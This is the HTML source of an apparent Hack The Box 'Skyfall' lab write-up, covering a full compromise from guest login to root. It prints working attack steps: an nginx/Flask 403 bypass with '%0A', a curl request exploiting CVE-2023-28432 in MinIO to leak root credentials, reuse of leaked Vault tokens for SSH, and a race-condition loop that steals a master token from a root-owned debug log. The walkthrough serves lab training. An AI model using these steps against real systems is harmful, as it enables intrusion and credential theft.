+      <h2 id="web-enumeration">
+        
+        
+          Web enumeration <a href="#web-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>Taking a look with curl, I can see its using nginx and its about a Sky Storage solution:</p>
+
+<pre><code class="language-bash">❯ curl -i -s http://10.10.11.254 | less
+</code></pre>
+<p><img src="/assets/images/Skyfall/curl-output.png" alt="curl output" /></p>
+
+<p>In the browser, I can see this landing page:</p>
+
+<p><img src="/assets/images/Skyfall/main-page.png" alt="main page" /></p>
+
+<p>The only interesting thing here is this link that goes to demo.skyfall.htb:</p>
+
+<p><img src="/assets/images/Skyfall/demo-link.png" alt="demo link" /></p>
+
+<p>So I will add this line to the /etc/hosts:</p>
+
+<pre><code class="language-plaintext">10.10.11.254 skyfall.htb demo.skyfall.htb
+</code></pre>
+
+<p>Going to this link brings me to this login page:</p>
+
+<p><img src="/assets/images/Skyfall/demo.skyfall.htb-main-page.png" alt="demo.skyfall.htb main page" /></p>
+
+<p>It gives me credentials to try the demo (guest / guest), so I will introduce them and I gain access to the panel:</p>
+
+<p><img src="/assets/images/Skyfall/guest-dashboard.png" alt="guest dashboard" /></p>
+
+<p>There are some issues and they are talking about Minio Storage. Searching in google, I can see that its about a open source object storage compatible with amazon s3, kubernetes, etc:</p>
+
+<p><img src="/assets/images/Skyfall/what-is-minio-storage.png" alt="what is minio storage" /></p>
+
+<p>I didn’t found a minio server still so I will ignore this by now and I will look more the web. Also in the bottom, I can see its made with Flask. There are some functionalities here, which are “Files”, “Beta Features”, “URL Fetch”, “MinIO Metrics”, “Feedback” and “Escalate”.</p>
+
+<p>The files link has a utility to upload files and view the ones uploaded. It has a welcome.pdf by default:</p>
+
+<p><img src="/assets/images/Skyfall/files-functionality.png" alt="files functionality" /></p>
+
+<p>Downloading it just shows a welcome pdf with no important information:</p>
+
+<p><img src="/assets/images/Skyfall/welcome-pdf.png" alt="welcome pdf" /></p>
+
+<p>I can also upload some files and download them. For example, I will upload a testing.txt and see its functionalities:</p>
+
+<p><img src="/assets/images/Skyfall/uploaded-file-testing.txt.png" alt="uploaded file testing.txt" /></p>
+
+<p>It has download, delete and rename functionalities. I will ignore them by now.</p>
+
+<p>I can also try to upload something with path traversal like ‘../../../../../../../../proc/self/cwd/app.py’ but its renamed to a secure filename:</p>
+
+<p><img src="/assets/images/Skyfall/trying-to-upload-app.py-in-cwd-of-proc.png" alt="trying to upload app.py in cwd" /></p>
+
+<p><img src="/assets/images/Skyfall/renamed-to-safe-filename.png" alt="renamed to safe filename" /></p>
+
+<p>The “Beta Features” page is forbidden for me (probably because I’m guest user):</p>
+
+<p><img src="/assets/images/Skyfall/beta-feature-forbidden.png" alt="beta feature forbidden" /></p>
+
+<p>The “URL Fetch” option is for downloading file from an URL, and if I put my http server, it makes a request and downloads it into a file:</p>
+
+<p><img src="/assets/images/Skyfall/uploaded-from-http-server.png" alt="uploaded from http server" /></p>
+
+<p><img src="/assets/images/Skyfall/request-to-my-http-server.png" alt="request to my http server" /></p>
+
+<p>Obviously, its also stored in the server and I can view it in the “Files” page and do the same actions with it:</p>
+
+<p><img src="/assets/images/Skyfall/test.txt-visible-in-files-page.png" alt="test.txt visible in Files page" /></p>
+
+<p>The “MinIO metrics” page gives another “403 forbidden” but its different from the one of before. It’s a 403 from nginx and the other was probably programmed in flask:</p>
+
+<p><img src="/assets/images/Skyfall/metrics-403.png" alt="metrics 403" /></p>
+
+<p>A nice tool to try to bypass 403 using a lot of techniques is <a href="https://github.com/devploit/nomore403">nomore403</a>, so I will clone it and execute it against the metrics URL:</p>
+
+<pre><code class="language-bash">❯ git clone https://github.com/devploit/nomore403
+Cloning into 'nomore403'...
+remote: Enumerating objects: 478, done.
+remote: Counting objects: 100% (167/167), done.
+remote: Compressing objects: 100% (95/95), done.
+remote: Total 478 (delta 74), reused 124 (delta 67), pack-reused 311 (from 1)
+Receiving objects: 100% (478/478), 172.53 KiB | 1.14 MiB/s, done.
+Resolving deltas: 100% (250/250), done.
+❯ cd nomore403
+❯ ls
+cmd  payloads  go.mod  go.sum  LICENSE  main.go  README.md
+❯ go build .
+❯ ls
+LICENSE  README.md  cmd  go.mod  go.sum  main.go  nomore403  payloads
+❯ chmod +x nomore403
+</code></pre>
+
+<pre><code class="language-bash">❯ ./nomore403 -H "Cookie: session=.eJwljklqBEEMBP9SZx9qVUvzmUZLChuDDd0zJ-O_u8DHyCAhfsqZF-738nheL7yV8yPKo3RuIwcEA-azNzFWA3E1gFcGbeMsVCPEgeiVlT0Rrap1tiTm2YTmWuI0Vk5bM4iO4K4cHZD9bOPwrjIoaq-eqpXhYQ1ZdsjrxvVf0zb6feX5_P7E1x5SJTUN6UZtEC_j6tA44pBVD5mVFD1G-f0D3jZBtg.ZsJoXQ.3_gAJxuz_FOEOl4xmMJ5j4qf4tA" -u http://demo.skyfall.htb/metrics | grep -v 403
+Target: 		http://demo.skyfall.htb/metrics
+Headers: 		{Cookie  session=.eJwljklqBEEMBP9SZx9qVUvzmUZLChuDDd0zJ-O_u8DHyCAhfsqZF-738nheL7yV8yPKo3RuIwcEA-azNzFWA3E1gFcGbeMsVCPEgeiVlT0Rrap1tiTm2YTmWuI0Vk5bM4iO4K4cHZD9bOPwrjIoaq-eqpXhYQ1ZdsjrxvVf0zb6feX5_P7E1x5SJTUN6UZtEC_j6tA44pBVD5mVFD1G-f0D3jZBtg.ZsJoXQ.3_gAJxuz_FOEOl4xmMJ5j4qf4tA}
+Proxy: 			false
+Method: 		GET
+Payloads folder: 	payloads
+Custom bypass IP: 	false
+Follow Redirects: 	false
+Rate Limit detection: 	false
+Status: 		
+Timeout (ms): 		6000
+Delay (ms): 		0
+Techniques: 		verbs, verbs-case, headers, endpaths, midpaths, http-versions, path-case
+Unique: 		false
+Verbose: 		false
+
+━━━━━━━━━━━━━━━ VERB TAMPERING ━━━━━━━━━━━━━━━
+405 	          327 bytes TRACE
+
+━━━━━━━ VERB TAMPERING CASE SWITCHING ━━━━━━━━
+
+━━━━━━━━━━━━━━━━━━ HEADERS ━━━━━━━━━━━━━━━━━━━
+
+━━━━━━━━━━━━━━━ CUSTOM PATHS ━━━━━━━━━━━━━━━━━
+500 	          854 bytes http://demo.skyfall.htb/metrics.html
+200 	        45335 bytes http://demo.skyfall.htb/metrics%0A
+302 	          428 bytes http://demo.skyfall.htb/#?metrics
+302 	          428 bytes http://demo.skyfall.htb/#metrics
+302 	          428 bytes http://demo.skyfall.htb///?anythingmetrics
+302 	          428 bytes http://demo.skyfall.htb/?metrics
+302 	          428 bytes http://demo.skyfall.htb/???metrics
+302 	          428 bytes http://demo.skyfall.htb/??metrics
+
+━━━━━━━━━━━━━━━ HTTP VERSIONS ━━━━━━━━━━━━━━━━
+
+━━━━━━━━━━━━ PATH CASE SWITCHING ━━━━━━━━━━━━━
+
+</code></pre>
+
+<p>It shows a 200 status code using <code>metrics%0A</code>, %0A decoded is a line break. This happens probably because this path is configured to be forbidden with nginx, which see that the url does not match with <code>/metrics</code> and doesn’t do anything to block it. Then, the flask server checks this url and as werkzeug uses the strip function, it results in the /metrics page. Trying it gives us the MinIO metrics page!:</p>
+
+<p><img src="/assets/images/Skyfall/minio-metrics-page.png" alt="minio metrics page" /></p>
+
+<blockquote>
+  <p>For more information on how this bypass works check <a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-flask">this page</a></p>
+</blockquote>
+
+<p>Here its leaked the minio endpoint subdomain at the bottom:</p>
+
+<p><img src="/assets/images/Skyfall/minio-endpoint.png" alt="minio endpoint" /></p>
+
+<p>Also, the version its leaked:</p>
+
+<p><img src="/assets/images/Skyfall/minio-version-leaked.png" alt="minio version leaked" /></p>
+
+<p>After adding it to the /etc/hosts, making a curl against it returns an expected access denied error:</p>
+
+<pre><code class="language-http">❯ curl -i -sS http://prd23-s3-backend.skyfall.htb/
+HTTP/1.1 403 Forbidden
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sun, 18 Aug 2024 22:16:53 GMT
+Content-Type: application/xml
+Content-Length: 254
+Connection: keep-alive
+Accept-Ranges: bytes
+Content-Security-Policy: block-all-mixed-content
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+Vary: Accept-Encoding
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 17ECF285AAB4E0B3
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;Error&gt;&lt;Code&gt;AccessDenied&lt;/Code&gt;&lt;Message&gt;Access Denied.&lt;/Message&gt;&lt;Resource&gt;/&lt;/Resource&gt;&lt;RequestId&gt;17ECF285AAB4E0B3&lt;/RequestId&gt;&lt;HostId&gt;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855&lt;/HostId&gt;&lt;/Error&gt;
+</code></pre>
+
+<p>The documentation of MinIO is available <a href="https://min.io/docs/minio/linux/index.html">here</a> and I can see that the tool to interact with a MinIO server is <code>mc</code> (<a href="https://min.io/docs/minio/linux/reference/minio-mc.html">minio client</a>) so first I will install it like specified in the docs:</p>
+
+<pre><code class="language-bash">❯ curl https://dl.min.io/client/mc/release/linux-amd64/mc --create-dirs -o $HOME/minio-binaries/mc
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 25.9M  100 25.9M    0     0  1720k      0  0:00:15  0:00:15 --:--:-- 1336k
+❯ chmod +x $HOME/minio-binaries/mc
+</code></pre>
+
+<p>Now I have it in a folder called minio-binaries in my user’s home directory. The documentation also gives instructions on how to create an alias for a MinIO server for later interacting with it. However, I need the access key and secret key, which I don’t have:</p>
+
+<p><img src="/assets/images/Skyfall/create-an-alias-minio.png" alt="create alias MinIO" /></p>
+
+<p><a href="https://min.io/docs/minio/linux/operations/install-deploy-manage/deploy-minio-single-node-single-drive.html">Here</a> is an example of how to deploy minio and I could try that credentials specified but it won’t be so easy:</p>
+
+<pre><code class="language-bash">❯ /home/gabri/minio-binaries/mc alias set skyfall-minio http://prd23-s3-backend.skyfall.htb myminioadmin minio-secret-key-change-me
+mc: &lt;ERROR&gt; Unable to initialize new alias from the provided credentials. The Access Key Id you provided does not exist in our records.
+</code></pre>
+
+<p>Looking for vulnerabilities of minio 2023-03-13T19:46:17Z (version that I saw in the MinIO metrics page), I saw <a href="https://www.cvedetails.com/cve/CVE-2023-28432/">CVE-2023-28432</a> which is an information disclosure that leaks all the environment variable, including the MINIO_SECRET_KEY and MINIO_ROOT_PASSWORD, which is what I’m searching for:</p>
+
+<p><img src="/assets/images/Skyfall/minio-vulnerable-to-info-disclosure.png" alt="minio vulnerable to info disclosure" /></p>
+
+<p>The MinIO version in this server matches that range between 2019-12-17T23-16-33Z and 2023-03-20T20-16-18Z, so it’s vulnerable.</p>
+
+<p>Now, searching for exploits I saw <a href="https://github.com/acheiii/CVE-2023-28432">this one</a> and the only things that does is make a POST request to /minio/bootstrap/v1/verify:</p>
+
+<p><img src="/assets/images/Skyfall/poc-script-just-makes-a-request.png" alt="poc script just makes a request" /></p>
+
+<p>So I will do it manually with curl:</p>
+
+<pre><code class="language-bash">❯ curl -sS -X POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify | jq '.MinioEnv'
+</code></pre>
+<pre><code class="language-json">{
+  "MINIO_ACCESS_KEY_FILE": "access_key",
+  "MINIO_BROWSER": "off",
+  "MINIO_CONFIG_ENV_FILE": "config.env",
+  "MINIO_KMS_SECRET_KEY_FILE": "kms_master_key",
+  "MINIO_PROMETHEUS_AUTH_TYPE": "public",
+  "MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0",
+  "MINIO_ROOT_PASSWORD_FILE": "secret_key",
+  "MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww",
+  "MINIO_ROOT_USER_FILE": "access_key",
+  "MINIO_SECRET_KEY_FILE": "secret_key",
+  "MINIO_UPDATE": "off",
+  "MINIO_UPDATE_MINISIGN_PUBKEY": "RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"
+}
+</code></pre>
+
+<p>And I have the MINIO_ROOT_USER and MINIO_ROOT_PASSWORD so I will try to make an alias for this MinIO instance:</p>
+
+<pre><code class="language-bash">❯ /home/gabri/minio-binaries/mc alias set skyfall-minio http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0
+</code></pre>
+<pre><code class="language-plaintext">Added `skyfall-minio` successfully.
+</code></pre>
+
+<p>It worked! Now I can run operations with it. The operation to see the buckets and files it <a href="https://min.io/docs/minio/linux/reference/minio-mc/mc-ls.html">mc ls</a>, so I will run it:</p>
+
+<pre><code class="language-bash">❯ /home/gabri/minio-binaries/mc ls --recursive --versions skyfall-minio
+</code></pre>
+<p><img src="/assets/images/Skyfall/mc-ls-output.png" alt="mc ls output" /></p>
+
+<p>And I can see the files belonging to each user and also the ones of guest (which are mine). The most intereseting ones are the different versions of home_backup.tar.gz of askyy. I will start with the one that occupies more as it probably has more data. I will download it using <a href="https://min.io/docs/minio/linux/reference/minio-mc/mc-cp.html">mc cp</a> and the –version-id parameter:</p>
+
+<pre><code class="language-bash">❯ /home/gabri/minio-binaries/mc cp skyfall-minio/askyy/home_backup.tar.gz home_backup.tar.gz --vid '3c498578-8dfe-43b7-b679-32a3fe42018f'
+</code></pre>
+
+<p>Decompressing and viewing the contents as expected shows askyy’s home:</p>
+
+<pre><code class="language-bash">❯ mkdir askyy_home_v1
+❯ mv home_backup.tar.gz askyy_home_v1
+❯ cd askyy_home_v1
+❯ tar -xf home_backup.tar.gz
+❯ rm home_backup.tar.gz
+</code></pre>
+<pre><code class="language-bash">❯ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh  .sudo_as_admin_successful	.viminfo  terraform-generator
+</code></pre>
+
+<p>The .ssh directory has an id_rsa but it doesn’t work for askyy user:</p>
+
+<pre><code class="language-plaintext">❯ /bin/ls -a .ssh
+.  ..  authorized_keys	id_rsa	id_rsa.pub
+❯ ssh -i .ssh/id_rsa askyy@skyfall.htb
+The authenticity of host 'skyfall.htb (10.10.11.254)' can't be established.
+ED25519 key fingerprint is SHA256:mUK/F6yhenOEZEcLnWWWl3FVk3PiHC8ETKpL3Sz773c.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'skyfall.htb' (ED25519) to the list of known hosts.
+(askyy@skyfall.htb) Password: 
+</code></pre>
+
+<p>There is nothing more interesting here. I will try version 2 now:</p>
+
+<pre><code class="language-bash">❯ /home/gabri/minio-binaries/mc cp skyfall-minio/askyy/home_backup.tar.gz home_backup_v2.tar.gz --vid '2b75346d-2a47-4203-ab09-3c9f878466b8'
+❯ mkdir askyy_home_v2
+❯ mv home_backup_v2.tar.gz askyy_home_v2
+❯ cd askyy_home_v2
+❯ tar -xf home_backup_v2.tar.gz
+❯ rm home_backup_v2.tar.gz
+</code></pre>
+
+<p>Now there isn’t any id_rsa:</p>
+
+<pre><code class="language-bash">❯ /bin/ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh  .sudo_as_admin_successful
+❯ /bin/ls -a .ssh
+.  ..  authorized_keys
+</code></pre>
+
+<p>But in the .bashrc, there are two variable exported called “VAULT_API_ADDR” and “VAULT_TOKEN”, which are very interesting:</p>
+
+<pre><code class="language-bash">❯ bat .bashrc
+</code></pre>
+<p><img src="/assets/images/Skyfall/variables-exported-in-bashrc-askyy-home.png" alt="variables exported in bashrc of askyy home v2" /></p>
+
+<blockquote>
+  <p>Note: bat is just a cat with syntax highliting and table format (or not with -p). You can download it from <a href="https://github.com/sharkdp/bat">here</a></p>
+</blockquote>
+
+<p>There is a new host so I will add it to the /etc/hosts.</p>
+    
+      <h1 id="access-as-askyy">
+        
+        
+          Access as askyy <a href="#access-as-askyy" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Searching this variables in google makes me think that is using hashicorp vault:</p>
+
+<p><img src="/assets/images/Skyfall/hashicorp-vault-page.png" alt="hashicorp vault page" /></p>
+
+<p>Hashicorp vault is like a secrets management system:</p>
+
+<p><img src="/assets/images/Skyfall/what-is-vault.png" alt="what is vault" /></p>
+
+<p>I will install it like specified <a href="https://developer.hashicorp.com/vault/docs/install">here</a>:</p>
+
+<pre><code class="language-bash">❯ export GOPATH=$HOME/go
+❯ export PATH=$GOPATH/bin:$PATH
+❯ mkdir -p $GOPATH/src/github.com/hashicorp &amp;&amp; cd $_
+❯ git clone https://github.com/hashicorp/vault.git
+❯ cd vault
+❯ make bootstrap
+❯ make dev
+</code></pre>
+
+<p>Now I can execute vault because its in $GOPATH/bin:</p>
+
+<pre><code class="language-bash">❯ which vault
+/home/gabri/go/bin/vault
+❯ vault -h
+Usage: vault &lt;command&gt; [args]
+
+Common commands:
+    read        Read data and retrieves secrets
+    write       Write data, configuration, and secrets
+    delete      Delete secrets and configuration
+    list        List data or secrets
+    login       Authenticate locally
+    agent       Start a Vault agent
+    server      Start a Vault server
+    status      Print seal and HA status
+    unwrap      Unwrap a wrapped secret
+
+Other commands:
+    audit                Interact with audit devices
+    auth                 Interact with auth methods
+    debug                Runs the debug command
+    events               
+    hcp                  
+    kv                   Interact with Vault's Key-Value storage
+    lease                Interact with leases
+    monitor              Stream log messages from a Vault server
+    namespace            Interact with namespaces
+    operator             Perform operator-specific tasks
+    patch                Patch data, configuration, and secrets
+    path-help            Retrieve API help for paths
+    pki                  Interact with Vault's PKI Secrets Engine
+    plugin               Interact with Vault plugins and catalog
+    policy               Interact with policies
+    print                Prints runtime configurations
+    proxy                Start a Vault Proxy
+    secrets              Interact with secrets engines
+    ssh                  Initiate an SSH session
+    token                Interact with tokens
+    transform            Interact with Vault's Transform Secrets Engine
+    transit              Interact with Vault's Transit Secrets Engine
+    version-history      Prints the version history of the target Vault server
+
+</code></pre>
+
+<p>To use vault, I have to export VAULT_ADDR and VAULT_TOKEN, so I will use the ones of the .bashrc of askyy:</p>
+
+<pre><code class="language-bash">❯ export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
+❯ export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
+</code></pre>
+
+<p>In the <a href="https://developer.hashicorp.com/vault/docs/commands">vault command documentation</a>, I saw a ssh command which is interesting. It allows connecting with the target machine using one of the ssh secrets engine enabled. It has two modes, one with CA and one with OTP:</p>
+
+<p><img src="/assets/images/Skyfall/ssh-command-vault.png" alt="ssh command vault" /></p>
+
+<p>But I need a valid role and to list it I can use the list command against the route specified <a href="https://developer.hashicorp.com/vault/api-docs/secret/ssh#list-roles">here</a>:</p>
+
+<pre><code class="language-bash">❯ vault list ssh/roles
+Keys
+----
+admin_otp_key_role
+dev_otp_key_role
+</code></pre>
+
+<p>And I have two roles, of which dev_otp_key_role works for askyy user:</p>
+
+<pre><code class="language-bash">❯ vault ssh -role dev_otp_key_role -mode otp -strict-host-key-checking no askyy@skyfall.htb
+Warning: Permanently added 'skyfall.htb' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Tue Aug 20 09:46:20 2024 from 10.10.14.106
+askyy@skyfall:~$ 
+</code></pre>
+
+<blockquote>
+  <p>Note: the <code>-strict-host-key-checking no</code> is for vault ssh to not check the host certificate because vault uses sshpass to automatize the ssh connection and sshpass its not able to authorize an ssh connection. Another solution can be uninstalling sshpass and entering the OTP manually.</p>
+</blockquote>
+
+<p>The user flag is available in the user’s home:</p>
+
+<pre><code class="language-bash">askyy@skyfall:~$ cat user.txt 
+79****************************f5
+</code></pre>
+    
+      <h1 id="access-as-root">
+        
+        
+          Access as root <a href="#access-as-root" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Looking at the sudo privileges, I can run vault-unseal with some parameters:</p>
+
+<pre><code class="language-bash">askyy@skyfall:~$ sudo -l
+Matching Defaults entries for askyy on skyfall:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User askyy may run the following commands on skyfall:
+    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
+    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
+</code></pre>
+
+<p>That executable is from <a href="https://github.com/lrstanley/vault-unseal">here</a>. Its an utility to unseal vault data using tokens distributed in various instances.</p>
+
+<p>For more information on how hashicorp vault unseals data check <a href="https://developer.hashicorp.com/vault/docs/concepts/seal#auto-unseal">this page</a> but its not relevant for the exploitation.</p>
+
+<p>Looking at the help panel, I can see for what are the parameters:</p>
+
+<pre><code class="language-bash">askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
+Usage:
+  vault-unseal [OPTIONS]
+
+Application Options:
+  -v, --verbose        enable verbose output
+  -d, --debug          enable debugging output to file (extra logging)
+  -c, --config=PATH    path to configuration file
+
+Help Options:
+  -h, --help           Show this help message
+</code></pre>
+
+<p><code>-v</code> is for verbose output, <code>-c</code> is to specify the config file and <code>-d</code> <strong>outputs debugging info into a file</strong>. I will run it with -v:</p>
+
+<pre><code class="language-bash">askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v
+[+] Reading: /etc/vault-unseal.yaml
+[-] Security Risk!
+[-] Master token found in config: ****************************
+[&gt;] Enable 'debug' mode for details
+[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
+[&gt;] Check interval: 5s
+[&gt;] Max checks: 5
+[&gt;] Checking seal status
+[+] Vault sealed: false
+</code></pre>
+
+<p>Its saying that the master token was found in config but I don’t have access to read it:</p>
+
+<pre><code class="language-bash">askyy@skyfall:~$ cat /etc/vault-unseal.yaml 
+cat: /etc/vault-unseal.yaml: Permission denied
+</code></pre>
+
+<p>The <code>-d</code> parameter creates a debug.log in the current directory:</p>
+
+<pre><code class="language-bash">askyy@skyfall:/tmp$ ls -a
+.           .X11-unix         systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-logind.service-6IF9X1
+..          .XIM-unix         systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-resolved.service-g7qYCh
+.ICE-unix   .font-unix        systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-timesyncd.service-DjNSEM
+.Test-unix  snap-private-tmp  vmware-root_522-2965382515
+askyy@skyfall:/tmp$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d
+[&gt;] Checking seal status
+[+] Vault sealed: false
+askyy@skyfall:/tmp$ ls -a
+.          .Test-unix  .font-unix        systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-logind.service-6IF9X1     vmware-root_522-2965382515
+..         .X11-unix   debug.log         systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-resolved.service-g7qYCh
+.ICE-unix  .XIM-unix   snap-private-tmp  systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-timesyncd.service-DjNSEM
+</code></pre>
+
+<p>But I can’t read it because permissions:</p>
+
+<pre><code class="language-bash">askyy@skyfall:/tmp$ ls -l debug.log 
+-rw------- 1 root root 555 Aug 22 15:40 debug.log
+askyy@skyfall:/tmp$ cat debug.log 
+cat: debug.log: Permission denied
+</code></pre>
+
+<p>However, if the file is removed before writing it, its possible to make a race condition, where if a file <code>debug.log</code> its created before vault-unseal writes to it, I will be able to see the contents because it will be owned by me and root will just modify it. For that I need three terminals, one to create the debug.log, other to cat it in a loop and the other to execute the vault-unseal command.</p>
+
+<p><strong>First terminal</strong>:</p>
+<pre><code class="language-bash">askyy@skyfall:/tmp$ mkdir racecondition
+askyy@skyfall:/tmp$ cd racecondition/
+askyy@skyfall:/tmp/racecondition$ while true; do touch debug.log 2&gt;/dev/null; rm debug.log; done
+</code></pre>
+
+<p><strong>Second terminal</strong>:</p>
+<pre><code class="language-bash">askyy@skyfall:/tmp$ while true; do cat /tmp/racecondition/debug.log 2&gt;/dev/null; done
+</code></pre>
+
+<p><strong>Third terminal</strong>:</p>
+
+<pre><code class="language-bash">askyy@skyfall:/tmp$ cd /tmp/racecondition
+askyy@skyfall:/tmp/racecondition$ while true; do (sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd) &amp;&gt;/dev/null;done
+</code></pre>
+
+<p>It looks like this:</p>
+
+<p><img src="/assets/images/Skyfall/race-condition-vault-unseal.png" alt="race condition vault unseal" /></p>
+
+<p>After running those, in the output of the second terminal, I can see the master token:</p>
+
+<pre><code class="language-bash">2024/08/22 16:36:09 Initializing logger...
+2024/08/22 16:36:09 Reading: /etc/vault-unseal.yaml
+2024/08/22 16:36:09 Security Risk!
+2024/08/22 16:36:09 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
+2024/08/22 16:36:09 Found Vault node: http://prd23-vault-internal.skyfall.htb
+2024/08/22 16:36:09 Check interval: 5s
+2024/08/22 16:36:09 Max checks: 5
+2024/08/22 16:36:09 Establishing connection to Vault...
+2024/08/22 16:36:09 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
+2024/08/22 16:36:09 Checking seal status
+2024/08/22 16:36:09 Vault sealed: false
+</code></pre>
+
+<p>So I will export it in my machine and connect as root:</p>
+
+<pre><code class="language-bash">❯ export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
+❯ export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
+❯ vault list ssh/roles
+Keys
+----
+admin_otp_key_role
+dev_otp_key_role
+❯ vault ssh -role dev_otp_key_role -mode otp -strict-host-key-checking no root@skyfall.htb
+failed to generate credential: failed to get credentials: Error making API request.
+
+URL: PUT http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role
+Code: 400. Errors:
+
+* Username is not present is allowed users list
+</code></pre>
+
+<p>That role doesn’t work, so I will use the other one (and it makes sense as root is an admin) and it works:</p>
+
+<pre><code class="language-bash">❯ vault ssh -role admin_otp_key_role -mode otp -strict-host-key-checking no root@skyfall.htb
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Thu Aug 22 11:07:34 2024 from 10.10.14.97
+root@skyfall:~# 
+</code></pre>
+
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>2 September 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=forbidden-bypass" class="tag" style="font-family: 'Cascadia Code';">forbidden-bypass</a>
+    
+    <a href="/search?q=minio-cloud" class="tag" style="font-family: 'Cascadia Code';">minio-cloud</a>
+    
+    <a href="/search?q=minio-cve" class="tag" style="font-family: 'Cascadia Code';">minio-cve</a>
+    
+    <a href="/search?q=CVE-2023-28432" class="tag" style="font-family: 'Cascadia Code';">CVE-2023-28432</a>
+    
+    <a href="/search?q=hashicorp-vault" class="tag" style="font-family: 'Cascadia Code';">hashicorp-vault</a>
+    
+    <a href="/search?q=vault-ssh" class="tag" style="font-family: 'Cascadia Code';">vault-ssh</a>
+    
+    <a href="/search?q=sudoers" class="tag" style="font-family: 'Cascadia Code';">sudoers</a>
+    
+    <a href="/search?q=vault-unseal" class="tag" style="font-family: 'Cascadia Code';">vault-unseal</a>
+    
+    <a href="/search?q=race-condition" class="tag" style="font-family: 'Cascadia Code';">race-condition</a>
+    
+    
+</div>
+  <br>
+  Share this writeup:&nbsp;
+  <a
+    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/HTB/Skyfall.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/HTB/Skyfall.html&text=Writeup+for+HTB Skyfall writeup+from+HTB+held+on+02 September 2024&hashtags=ctf,writeup,Skyfall,HTB,forbidden-bypass,minio-cloud,minio-cve,CVE-2023-28432,hashicorp-vault,vault-ssh,sudoers,vault-unseal,race-condition','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
+  <a
